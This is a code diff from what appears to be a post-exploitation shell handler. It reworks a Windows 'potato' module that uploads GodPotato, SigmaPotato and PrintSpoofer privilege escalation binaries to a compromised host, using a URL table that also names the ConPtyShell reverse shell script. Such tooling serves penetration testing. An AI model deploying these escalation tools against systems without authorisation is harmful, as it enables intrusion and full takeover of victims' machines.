@@ -4512,24 +4512,28 @@ class upload_privesc_scripts(Module):
 
 
 class potato(Module):
-    category = "Privilege Escalation"
-    def run(session, args):
-        """
-        Upload the latest version of {GodPotato, SigmaPotato, and PrintSpoofer}
-        """
-        if not session.write_access(session.cwd):
-            return
+	category = "Privilege Escalation"
+	def run(session, args):
+		"""
+		Upload the latest version of {GodPotato, SigmaPotato, PrintSpoofer}
+		"""
+		if not session.write_access(session.cwd):
+			return
 
-        if session.OS == "Unix":
-            logger.error("This module runs only on Windows shells")
-        elif session.OS == "Windows":
-            session.upload(URLS['godpotato'])
-            session.upload(URLS['sigmapotato'])
-            if session.arch == "x64":
-                session.upload(URLS['printspoofer64'])
-            elif session.arch in ("x86", "i386", "i686"):
-                session.upload(URLS['printspoofer32'])
+		if session.OS == "Unix":
+			logger.error("This module runs only on Windows shells")
+		elif session.OS == "Windows":
+			session.upload(URLS['godpotato'])
+			session.upload(URLS['sigmapotato'])
 
+			if session.arch == "x64-based_PC":
+				session.upload(URLS['printspoofer64'])
+			elif session.arch == "x86-based_PC":
+				session.upload(URLS['printspoofer32'])
+			else:
+				logger.error("printspoofer: No predefined binary to upload.")
+				print()
+				return
 
 
 class peass_ng(Module):
@@ -5684,8 +5688,8 @@ URLS = {
 	'conptyshell':		"https://raw.githubusercontent.com/antonioCoco/ConPtyShell/refs/heads/master/Invoke-ConPtyShell.ps1",
 	'godpotato':		"https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe",
 	'sigmapotato':		"https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe",
-	'printspoofer64':		"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe",
-	'printspoofer32':		"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe",
+	'printspoofer64':	"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe",
+	'printspoofer32':	"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe",
 }
 EMOJIS = {
 	'folder':'📁', 'file':'📄', 'invalid_shell':'🙄', 'new_shell':'😍️', 'target':'🎯', 'upgrade':'💪', 'logfile':'📜',
